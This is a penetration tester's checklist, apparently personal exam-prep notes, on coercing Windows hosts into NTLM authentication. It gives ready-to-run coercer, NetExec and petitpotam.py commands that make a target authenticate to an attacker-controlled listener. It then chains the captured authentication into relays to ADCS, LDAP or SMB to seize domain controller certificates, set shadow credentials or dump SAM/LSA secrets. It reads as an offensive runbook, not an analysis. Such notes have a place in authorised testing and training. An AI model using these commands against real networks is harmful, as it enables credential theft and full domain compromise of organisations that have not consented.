# Coercion

- [ ] Not on the OSCP exam: coercion is kept out as a safe reading; OffSec's pages do not name it

## Before I start
- [ ] Listener decided FIRST: relay (ntlmrelayx: :Pb ntlm-relay) or capture (Responder: :Pb responder)
- [ ] Any domain credential works for every method here — no admin needed on the target

## What can this target be coerced with
coercer scan -t <Target> -u '<User>' -p '<Password>' -d <Domain> --filter-ip <AttackerIP>
nxc smb <Target> -u '<User>' -p '<Password>' -M coerce_plus -o LISTENER=<AttackerIP>
- [ ] Spooler running → PrinterBug; DFS service → DFSCoerce; shares hosted (FSRVP) → ShadowCoerce; EFS on → PetitPotam works everywhere

## Fire
coercer coerce -l <AttackerIP> -t <Target> -u '<User>' -p '<Password>' -d <Domain>
petitpotam.py -u '<User>' -p '<Password>' -d '<Domain>' <AttackerIP> <TargetFQDN>
nxc smb <Target> -u '<User>' -p '<Password>' -M petitpotam -o LISTENER=<AttackerIP>
- [ ] Need HTTP instead of SMB (workstation with WebClient): listener as `<AttackerIP>@80/file`

## The plays
- [ ] DC coerced → relayed to ADCS web enrolment = DC cert = domain: :Pb adcs
- [ ] DC coerced → relayed to LDAP(S) = shadow credentials / RBCD as DC$: :Pb acl-abuse
- [ ] Host coerced → relayed to SMB (signing off) = SAM/LSA as the machine account
- [ ] Coerced into Responder = machine$ Net-NTLMv2 — do NOT bother cracking, relay material only

## If it fails
- [ ] 2021+ patches killed UNAUTHENTICATED petitpotam — authed still fires; check the cred actually works on SMB first
- [ ] Method not supported on that build: walk petitpotam → printerbug → dfscoerce → shadowcoerce → wspcoerce, Coercer's scan already tells me which
- [ ] Nothing arrived: firewall between me and the target, or the listener bound the wrong interface

## Next
- [ ] The relay finished its job: :Pb ntlm-relay
- [ ] Coerced service accounts checked in BloodHound for the next path: :Pb domain-enum
